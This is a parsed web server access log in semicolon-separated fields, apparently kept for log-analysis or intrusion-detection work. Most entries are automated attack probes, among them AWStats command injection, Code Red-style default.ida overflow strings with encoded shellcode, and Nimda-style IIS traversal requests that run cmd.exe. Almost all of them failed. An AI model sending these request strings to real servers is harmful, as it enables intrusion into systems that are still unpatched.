"rhost";"date";"time";"timezone";"method";"request_first_line";"http_version";"final_state_code";"bytes";"referer";"user_agent";"compatibility";"MSIE";"MSIE_version";"OS";"OS_version"
"81.181.146.13";"Mar 15";"05:06:57";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";500;1097;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:06:58";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1051;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:06:58";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:06:58";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1051;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:06:58";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:06:58";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:06:58";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:06:59";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1051;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:06:59";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:06:59";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:06:59";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:06:59";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:06:59";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:06:59";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:07:00";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:07:00";500;"GET";"//cgi bin/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";500;1097;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:07:00";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:07:00";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:07:00";500;"GET";"//cgi bin/awstats/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:07:00";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:07:00";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:07:00";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:07:01";500;"GET";"//cgi/awstats.pl?configdir=|%20id%20|";"HTTP/1.1";404;1050;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:07:01";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:07:02";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"81.181.146.13";"Mar 15";"05:07:04";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"6";"Windows";"98"
"201.9.48.227";"Mar 15";"06:41:13";500;"GET";"/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"217.204.59.69";"Mar 15";"07:53:14";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"218.6.162.19";"Mar 15";"11:24:02";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"24.11.17.100";"Mar 15";"15:07:49";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"65.96.54.37";"Mar 15";"18:58:33";500;"GET";"/NULL.printer";"";404;1061;"";"";"";"";"";"";""
"195.70.152.248";"Mar 15";"22:20:33";500;"GET";"/NULL.printer";"";404;1061;"";"";"";"";"";"";""
"62.6.139.11";"Mar 15";"23:45:24";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"211.158.94.106";"Mar 16";"00:09:48";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"207.228.251.216";"Mar 16";"01:01:42";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:42";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:42";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:42";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:42";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:42";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:42";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.228.251.216";"Mar 16";"01:01:43";500;"GET";"/sumthin";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"218.11.95.43";"Mar 16";"02:45:42";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.11.95.43";"Mar 16";"02:45:46";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.11.95.43";"Mar 16";"02:45:50";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.11.95.43";"Mar 16";"02:45:54";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.11.95.43";"Mar 16";"02:45:55";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.11.95.43";"Mar 16";"02:46:00";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.11.95.43";"Mar 16";"02:46:01";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"218.11.95.43";"Mar 16";"02:46:02";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"69.67.42.139";"Mar 16";"05:40:40";500;"GET";"/scripts/nsiislog.dll";"HTTP/1.1";404;1050;"";"";"";"";"";"";""
"66.134.74.113";"Mar 16";"06:11:36";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"204.102.106.121";"Mar 16";"07:29:44";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"68.166.35.226";"Mar 16";"08:48:01";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"61.10.7.209";"Mar 16";"08:53:44";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"207.243.156.65";"Mar 16";"09:34:15";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"71.16.50.10";"Mar 16";"10:35:23";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:24";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:24";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:25";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:25";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:25";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:26";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:26";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:26";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:27";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:27";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:27";500;"GET";"/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:27";500;"GET";"/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:28";500;"GET";"/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:28";500;"GET";"/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"71.16.50.10";"Mar 16";"10:35:28";500;"GET";"/scripts/..%252f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"66.171.199.116";"Mar 16";"12:42:10";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"64.83.24.184";"Mar 16";"13:23:40";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"66.30.71.74";"Mar 16";"13:46:56";500;"GET";"/NULL.printer";"";404;1061;"";"";"";"";"";"";""
"208.62.177.10";"Mar 16";"14:29:06";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"209.120.201.177";"Mar 16";"14:29:28";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:29";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:31";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:32";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:33";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:34";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:35";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:36";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:38";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:39";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:41";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:42";500;"GET";"/scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:43";500;"GET";"/scripts/..%%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:44";500;"GET";"/scripts/..%%35c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";400;974;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:45";500;"GET";"/scripts/..%25%35%63../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"209.120.201.177";"Mar 16";"14:29:46";500;"GET";"/scripts/..%252f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"65.16.76.54";"Mar 16";"15:45:05";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"65.16.76.54";"Mar 16";"15:50:30";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1062;"";"";"";"";"";"";""
"218.85.9.143";"Mar 16";"18:23:17";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"218.85.9.143";"Mar 16";"18:23:17";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"218.85.9.143";"Mar 16";"18:23:18";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"218.85.9.143";"Mar 16";"18:23:17";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"218.85.9.143";"Mar 16";"18:23:18";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"218.85.9.143";"Mar 16";"18:23:18";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"218.85.9.143";"Mar 16";"18:23:18";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"218.85.9.143";"Mar 16";"18:23:19";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"218.85.9.143";"Mar 16";"18:23:18";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"218.85.9.143";"Mar 16";"18:23:19";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"218.85.9.143";"Mar 16";"18:23:20";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"218.85.9.143";"Mar 16";"18:23:20";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"218.85.9.143";"Mar 16";"18:23:21";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"218.85.9.143";"Mar 16";"18:23:21";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"218.85.9.143";"Mar 16";"18:23:21";500;"GET";"http://www.intel.com/";"HTTP/1.1";403;2898;"";"Mozilla/5.0";"compatible";"MSIE";"5.01";"Windows";"2000"
"67.81.23.243";"Mar 16";"19:08:50";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"202.122.16.7";"Mar 16";"19:41:55";500;"POST";"/_vti_bin/_vti_aut/fp30reg.dll";"HTTP/1.1";404;1063;"";"";"";"";"";"";""
"220.170.151.237";"Mar 16";"19:49:21";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"64.83.24.184";"Mar 16";"20:35:18";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"222.166.160.138";"Mar 17";"00:08:12";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"61.10.7.45";"Mar 17";"04:42:15";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"69.107.121.41";"Mar 17";"05:31:20";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"201.9.104.83";"Mar 17";"05:43:04";500;"GET";"/default.ida?XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u6858%ucbd3%u7801%u9090%u9090%u8190%u00c3%u0003%u8b00%u531b%u53ff%u0078%u0000%u00=a";"HTTP/1.0";404;1061;"";"";"";"";"";"";""
"207.10.54.33";"Mar 17";"08:26:36";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"68.98.176.140";"Mar 17";"09:12:05";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"68.250.190.161";"Mar 17";"10:06:25";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"219.150.244.58";"Mar 17";"11:38:27";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"24.196.254.170";"Mar 06";"05:28:52";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"192.195.225.6";"Mar 06";"05:31:37";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"218.75.19.178";"Mar 06";"06:37:20";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"65.115.46.225";"Mar 06";"07:45:21";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"219.137.79.110";"Mar 06";"09:05:38";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"219.61.8.78";"Mar 06";"09:12:31";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"208.57.191.112";"Mar 06";"10:31:42";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"64.90.198.61";"Mar 06";"12:19:50";500;"GET";"/";"HTTP/1.1";403;2898;"";"Mozilla/4.0";"compatible";"MSIE";"5.5";"Windows";"98"
"68.233.81.168";"Mar 06";"13:56:46";500;"GET";"/scripts/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"68.233.81.168";"Mar 06";"13:56:46";500;"GET";"/MSADC/root.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"68.233.81.168";"Mar 06";"13:56:46";500;"GET";"/c/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"68.233.81.168";"Mar 06";"13:56:47";500;"GET";"/d/winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"68.233.81.168";"Mar 06";"13:56:47";500;"GET";"/scripts/..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"68.233.81.168";"Mar 06";"13:56:47";500;"GET";"/_vti_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"68.233.81.168";"Mar 06";"13:56:47";500;"GET";"/_mem_bin/..%255c../..%255c../..%255c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"68.233.81.168";"Mar 06";"13:56:47";500;"GET";"/msadc/..%255c../..%255c../..%255c/..%c1%1c../..%c1%1c../..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"68.233.81.168";"Mar 06";"13:56:48";500;"GET";"/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"68.233.81.168";"Mar 06";"13:56:48";500;"GET";"/scripts/..%c0%2f../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
"68.233.81.168";"Mar 06";"13:56:48";500;"GET";"/scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir";"HTTP/1.0";404;1041;"";"";"";"";"";"";""
